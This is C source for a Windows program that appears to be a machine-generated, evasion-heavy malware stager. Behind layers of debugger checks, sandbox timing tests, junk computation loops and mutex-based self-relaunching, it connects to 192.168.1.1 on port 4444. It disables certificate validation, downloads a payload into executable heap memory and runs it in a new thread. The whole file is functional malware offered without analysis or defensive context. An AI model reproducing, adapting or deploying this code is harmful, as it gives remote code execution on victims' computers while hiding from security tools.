#include <time.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <math.h>
#include <stdlib.h>
#include <wininet.h>
int PIjIRjJYYvx(char jaBJnxNorV[]) {
int GTZkYwzSDrle=0; int WTAHLRDbW;for (WTAHLRDbW=0; WTAHLRDbW<strlen(jaBJnxNorV);++WTAHLRDbW) GTZkYwzSDrle += jaBJnxNorV[WTAHLRDbW];
return (GTZkYwzSDrle % 256);}
char* IHpAKIylPEHKTjV(){
srand (time(NULL));int ggfqtURqqb;char ggdQCoBysyOmn[] = "Gdsp1RCmSV9Ii7XkZN6P4LADltcTf0nevJqob5YU3EgxwjFMu8QKOaWHyzr2hB";
char* FMMBpRDF = malloc(5); FMMBpRDF[4] = 0;
while (TRUE){
for(ggfqtURqqb=0;ggfqtURqqb<3;++ggfqtURqqb){FMMBpRDF[ggfqtURqqb] = ggdQCoBysyOmn[rand() % (sizeof(ggdQCoBysyOmn)-1)];}
for(ggfqtURqqb=0;ggfqtURqqb<sizeof(ggdQCoBysyOmn);ggfqtURqqb++){ FMMBpRDF[3] = ggdQCoBysyOmn[ggfqtURqqb];
if (PIjIRjJYYvx(FMMBpRDF) == 92) return FMMBpRDF; } } return 0;}
void hUtkVQLGmkjrj(){
float *CjCdSjIZtooIIRlWF = malloc(sizeof(float)*1545780);
int wYbCEcTwbfuGjcR;
int qUdxZsdqc;
float bouVXujZbwxMqevk;
for(wYbCEcTwbfuGjcR = 0;wYbCEcTwbfuGjcR < 1545780;wYbCEcTwbfuGjcR++){
CjCdSjIZtooIIRlWF[wYbCEcTwbfuGjcR] = (float)(rand() % 1000) / (float)(rand() % 70);}
for(wYbCEcTwbfuGjcR = 0;wYbCEcTwbfuGjcR < 1545780;wYbCEcTwbfuGjcR++){
for(qUdxZsdqc = 0;qUdxZsdqc < (1545780 - wYbCEcTwbfuGjcR - 1);wYbCEcTwbfuGjcR++){
if(CjCdSjIZtooIIRlWF[wYbCEcTwbfuGjcR] > CjCdSjIZtooIIRlWF[qUdxZsdqc + 1]){bouVXujZbwxMqevk = CjCdSjIZtooIIRlWF[qUdxZsdqc];
CjCdSjIZtooIIRlWF[qUdxZsdqc] = CjCdSjIZtooIIRlWF[wYbCEcTwbfuGjcR + 1];
CjCdSjIZtooIIRlWF[qUdxZsdqc + 1] = bouVXujZbwxMqevk;}}}
free(CjCdSjIZtooIIRlWF);
}
void fraDndhVAf(){
int TWNOVDvIMR,KnJtDWofn;
unsigned long long int OzeSsACTTJr = 0;
KnJtDWofn = 774486346;
for (TWNOVDvIMR = 1;TWNOVDvIMR <= KnJtDWofn; TWNOVDvIMR++){
OzeSsACTTJr = OzeSsACTTJr+TWNOVDvIMR;}
}
int main(int argc,char * argv[]){
int YTvKvXSTKw,RACELGJAvX;
unsigned long long int ClwTQYwSKpLM = 0;
RACELGJAvX = 772276240;
for (YTvKvXSTKw = 1;YTvKvXSTKw <= RACELGJAvX; YTvKvXSTKw++){
ClwTQYwSKpLM = ClwTQYwSKpLM+YTvKvXSTKw;}
int dxSlFeNoshws;
int* AxSnzvQhnP = malloc(sizeof(int) * 97816850);
int* ltKduuEdZCFF = malloc(sizeof(int) * 97816850);
int gjXFyrPHOCMNDZ = 97816850 - 1;
for(dxSlFeNoshws = 0;dxSlFeNoshws < 97816850;dxSlFeNoshws++){
AxSnzvQhnP[dxSlFeNoshws] = rand() % 300;
ltKduuEdZCFF[dxSlFeNoshws] = AxSnzvQhnP[gjXFyrPHOCMNDZ];
gjXFyrPHOCMNDZ = gjXFyrPHOCMNDZ - 1;}
free(AxSnzvQhnP);free(ltKduuEdZCFF);
BOOL GMvWgtYwVMB = FALSE;
FARPROC GXaMMuihpinMQU = GetProcAddress(GetModuleHandle("kernel32.dll"), "CheckRemoteDebuggerPresent");
GXaMMuihpinMQU(GetCurrentProcess(), &GMvWgtYwVMB);
if(GMvWgtYwVMB != TRUE){
FARPROC bfLzTeMaPFUi = GetProcAddress(GetModuleHandle("kernel32.dll"), "FlsAlloc");
DWORD mYousYMqKifzgtqgx = (DWORD)bfLzTeMaPFUi(NULL);
if(mYousYMqKifzgtqgx != FLS_OUT_OF_INDEXES){
HANDLE YPAjDdmFAAqktE = CreateEvent(NULL, TRUE, FALSE, NULL);if (YPAjDdmFAAqktE != NULL){
DWORD FjodSMamziMZPMzyl = WaitForSingleObject(YPAjDdmFAAqktE,1122);
int dwgSzLnNokBtt;
double MVtEZdaPL;
for(dwgSzLnNokBtt = 0;dwgSzLnNokBtt < 4988340;dwgSzLnNokBtt++){
MVtEZdaPL = exp((double)(3*rand() / (double)(RAND_MAX)));}
HANDLE jzhnAIBR;
FARPROC ShdJYxpc = GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenProcess");
jzhnAIBR = (HANDLE)ShdJYxpc( PROCESS_ALL_ACCESS, FALSE,4);
if(jzhnAIBR == NULL){
HANDLE aubVMJfGdRmhjH = CreateEvent(NULL, TRUE, FALSE, NULL);if (aubVMJfGdRmhjH != NULL){
DWORD buYVgscY = WaitForSingleObject(aubVMJfGdRmhjH,1364);
int YqdehvyXHyhLU = 0,MACmMVQae = 1,rHXAIzbzZ,fTPHEWYHUzcUdvXE,iSqCOnzmvBeNZnT = 0;
fTPHEWYHUzcUdvXE = 893596613;
while (iSqCOnzmvBeNZnT < fTPHEWYHUzcUdvXE){
rHXAIzbzZ = YqdehvyXHyhLU + MACmMVQae;
iSqCOnzmvBeNZnT++;
YqdehvyXHyhLU=MACmMVQae;
MACmMVQae = rHXAIzbzZ;}
HANDLE KzhIjtQlAicukvgJ;
KzhIjtQlAicukvgJ = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);
if(KzhIjtQlAicukvgJ == NULL){
FARPROC CTRGKquL = GetProcAddress(GetModuleHandle("kernel32.dll"), "FlsAlloc");
DWORD NEkUtyIuFqC = (DWORD)CTRGKquL(NULL);
if(NEkUtyIuFqC != FLS_OUT_OF_INDEXES){
DWORD FXAdSIBJvL;
DWORD oiUxAeeQvGebh;
FARPROC bFyFouQrBoThvX = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetTickCount");
FXAdSIBJvL = (DWORD)bFyFouQrBoThvX();
Sleep(527);
oiUxAeeQvGebh = (DWORD)bFyFouQrBoThvX();
if ((oiUxAeeQvGebh - FXAdSIBJvL) > 477){
DWORD meEMsEjB;
DWORD SPPAXoxHEHVotXYz;
FARPROC xtVmiVmkpETKrAPrt = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetTickCount");
meEMsEjB = (DWORD)xtVmiVmkpETKrAPrt();
Sleep(924);
SPPAXoxHEHVotXYz = (DWORD)xtVmiVmkpETKrAPrt();
if ((SPPAXoxHEHVotXYz - meEMsEjB) > 874){
int wbQEFtSdNgymdve;
int *RGwnsQiuvYGztTcHo = malloc(sizeof(int)*5615353);
int izHXcrmBvmdIHnbCUB = 0;
int ePOWBDJYaT = 0;
for(wbQEFtSdNgymdve = 0;wbQEFtSdNgymdve < 5615353;wbQEFtSdNgymdve++){
RGwnsQiuvYGztTcHo[wbQEFtSdNgymdve] = rand() % 1000;
if(RGwnsQiuvYGztTcHo[wbQEFtSdNgymdve]&1){
izHXcrmBvmdIHnbCUB += 1;}
else if(!(RGwnsQiuvYGztTcHo[wbQEFtSdNgymdve]&1)){
ePOWBDJYaT += 1;}}
free(RGwnsQiuvYGztTcHo);
HANDLE vvirkoFTVcHQqObyBp;
CreateMutex(NULL, TRUE,"WjnVydXf");
if(GetLastError() != ERROR_ALREADY_EXISTS){STARTUPINFO yxaNtMkXq;PROCESS_INFORMATION nghHXNUdo;
ZeroMemory(&yxaNtMkXq, sizeof(yxaNtMkXq));
ZeroMemory(&nghHXNUdo, sizeof(nghHXNUdo));
CreateProcess(argv[0],NULL,NULL,NULL,FALSE,0,NULL,NULL,&yxaNtMkXq,&nghHXNUdo);SleepEx(68816,FALSE);}
if(GetLastError() == ERROR_ALREADY_EXISTS){
HANDLE XOCQzcNNX;
CreateMutex(NULL, TRUE,"VSeijSbDndhIa");
if(GetLastError() != ERROR_ALREADY_EXISTS){FARPROC OwqoMyGLzJrwHKBi = GetProcAddress(GetModuleHandle("kernel32.dll"), "WinExec");
OwqoMyGLzJrwHKBi(argv[0],0);Sleep(44977);}
if(GetLastError() == ERROR_ALREADY_EXISTS){
HANDLE wVsDpCPlo;
CreateMutex(NULL, TRUE,"NAptTuggkqsBTYLqqo");
if(GetLastError() != ERROR_ALREADY_EXISTS){WinExec(argv[0],0);Sleep(66497);}
if(GetLastError() == ERROR_ALREADY_EXISTS){
HANDLE imKihvvvqDcM; DWORD qusnJZkkJVG; DWORD jpBdWCbvfjYu;
HANDLE AlvSpemgfbQUXixY;
HINTERNET cCOioWZyFLQNyeJsOW = InternetOpenA("Mozilla/4.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
if (cCOioWZyFLQNyeJsOW != NULL){
HINTERNET wZljDdFwvG = InternetConnectA(cCOioWZyFLQNyeJsOW, "192.168.1.1",4444, NULL,NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
if (wZljDdFwvG != NULL){
HINTERNET xAofRfiNjqseu = HttpOpenRequestA(wZljDdFwvG, "GET" ,IHpAKIylPEHKTjV() ,NULL, NULL, 0, 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000, 1);
if (xAofRfiNjqseu!= NULL){
DWORD swNIcdWZFpkrjnuxvJ = 0x00002000 | 0x00001000 | 0x00000200 | 0x00000100 | 0x00000080;
BOOL BqbQvrBdhV = InternetSetOption (xAofRfiNjqseu,INTERNET_OPTION_SECURITY_FLAGS, &swNIcdWZFpkrjnuxvJ, sizeof (swNIcdWZFpkrjnuxvJ) );
FARPROC GrkWslalOuRKeRNPvz = GetProcAddress(GetModuleHandle("kernel32.dll"), "HeapCreate");
AlvSpemgfbQUXixY = (HANDLE)GrkWslalOuRKeRNPvz(0x00040000,1000000, 0);
FARPROC vRbflHCcihWJKuP = GetProcAddress(GetModuleHandle("kernel32.dll"), "HeapAlloc");
LPVOID nGzUrFTYn = (LPVOID)vRbflHCcihWJKuP(AlvSpemgfbQUXixY, 0x00000008,1000000);
char * VOLCzafqGLUjb = nGzUrFTYn;
BOOL BQXdTXQDmrIGVmMVx = HttpSendRequestA(xAofRfiNjqseu, NULL, 0, NULL, 0);
if (BQXdTXQDmrIGVmMVx){
DWORD MmAEudiuCfoIT;
do{
BOOL JqXtrsqcUapiDvMaB = InternetReadFile(xAofRfiNjqseu,VOLCzafqGLUjb, 1024, &MmAEudiuCfoIT);
VOLCzafqGLUjb += MmAEudiuCfoIT;
}while(MmAEudiuCfoIT > 0);
FARPROC KXeDDKaEGMfPzIY = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
FARPROC vTtwfUwNoHZ = GetProcAddress(GetModuleHandle("kernel32.dll"), "WaitForSingleObject");
int pZERqdZouNl;
int* fQWfQqTRUYq = malloc(sizeof(int) * 50364869);
int* gveMTWIcA = malloc(sizeof(int) * 50364869);
int* RSjeJKnerVT = malloc(sizeof(int) * 50364869);
int* EpSwlLCvVXWsdP = malloc(sizeof(int) * 50364869);
int sHTfYbUUgWYfKxzB = 50364869 - 1;
for(pZERqdZouNl = 0;pZERqdZouNl < 50364869;pZERqdZouNl++){
fQWfQqTRUYq[pZERqdZouNl] = rand() % 300;
gveMTWIcA[pZERqdZouNl] = rand() % 300;
RSjeJKnerVT[pZERqdZouNl] = fQWfQqTRUYq[sHTfYbUUgWYfKxzB];
EpSwlLCvVXWsdP[pZERqdZouNl] = gveMTWIcA[sHTfYbUUgWYfKxzB];
sHTfYbUUgWYfKxzB = sHTfYbUUgWYfKxzB - 1;}
free(fQWfQqTRUYq);free(gveMTWIcA);free(RSjeJKnerVT);free(EpSwlLCvVXWsdP);
imKihvvvqDcM = (HANDLE) KXeDDKaEGMfPzIY(NULL,0,(LPVOID)nGzUrFTYn,NULL,0,&qusnJZkkJVG);
int kkevOgzSecCajIHpS;
double *VmyccHnm = malloc(sizeof(double)*4076402);
for(kkevOgzSecCajIHpS = 0;kkevOgzSecCajIHpS < 4076402;kkevOgzSecCajIHpS++){
VmyccHnm[kkevOgzSecCajIHpS] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}
for(kkevOgzSecCajIHpS = 0;kkevOgzSecCajIHpS < 4076402;kkevOgzSecCajIHpS++){
VmyccHnm[kkevOgzSecCajIHpS] = asin(VmyccHnm[kkevOgzSecCajIHpS]);}
jpBdWCbvfjYu = (DWORD)vTtwfUwNoHZ(imKihvvvqDcM,-1);
}}}}
}}}}}}}
}else{int kkevOgzSecCajIHpS;
double *VmyccHnm = malloc(sizeof(double)*4076402);
for(kkevOgzSecCajIHpS = 0;kkevOgzSecCajIHpS < 4076402;kkevOgzSecCajIHpS++){
VmyccHnm[kkevOgzSecCajIHpS] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}
for(kkevOgzSecCajIHpS = 0;kkevOgzSecCajIHpS < 4076402;kkevOgzSecCajIHpS++){
VmyccHnm[kkevOgzSecCajIHpS] = asin(VmyccHnm[kkevOgzSecCajIHpS]);}
}
}else{int MBqdTgLXLnjM;
double *GHfgSjSsTS = malloc(sizeof(double)*5649463);
double *LNozezGIGXvKFc = malloc(sizeof(double)*5649463);
for(MBqdTgLXLnjM = 0;MBqdTgLXLnjM < 5649463;MBqdTgLXLnjM++){
GHfgSjSsTS[MBqdTgLXLnjM] = (double)(rand() % 1000) / (double)(rand() % 70);}
for(MBqdTgLXLnjM = 0;MBqdTgLXLnjM < 5649463;MBqdTgLXLnjM++){
LNozezGIGXvKFc[MBqdTgLXLnjM] = floor(GHfgSjSsTS[MBqdTgLXLnjM]);}
}
}else{int ovSyBDJXsDle;
double *COeEVzIoecirZlXZC = malloc(sizeof(double)*4052518);
double *cqWgQizr = malloc(sizeof(double)*4052518);
for(ovSyBDJXsDle = 0;ovSyBDJXsDle < 4052518;ovSyBDJXsDle++){
COeEVzIoecirZlXZC[ovSyBDJXsDle] = (double)(rand() % 1000) / (double)(rand() % 70);}
for(ovSyBDJXsDle = 0;ovSyBDJXsDle < 4052518;ovSyBDJXsDle++){
cqWgQizr[ovSyBDJXsDle] = floor(COeEVzIoecirZlXZC[ovSyBDJXsDle]);}
}
}else{int AkBYdsMe,TJtrANiyPJvA;
int bWQTnKDPerpDpywxZV = 0;
float (*rcwVFRuXoqikPTcEp)[9448] = malloc(sizeof(float) * 9187 * 9448);
for(AkBYdsMe=0;AkBYdsMe < 9187;AkBYdsMe++){
for(TJtrANiyPJvA=0;TJtrANiyPJvA < 9448;TJtrANiyPJvA++){
rcwVFRuXoqikPTcEp[AkBYdsMe][TJtrANiyPJvA] = rand() % 100;
}}for(AkBYdsMe=0;AkBYdsMe < 9187;AkBYdsMe++){
for(TJtrANiyPJvA=0;TJtrANiyPJvA < 9448;TJtrANiyPJvA++){
bWQTnKDPerpDpywxZV = bWQTnKDPerpDpywxZV + rcwVFRuXoqikPTcEp[AkBYdsMe][TJtrANiyPJvA];
}}free(rcwVFRuXoqikPTcEp);
}
}return 0;}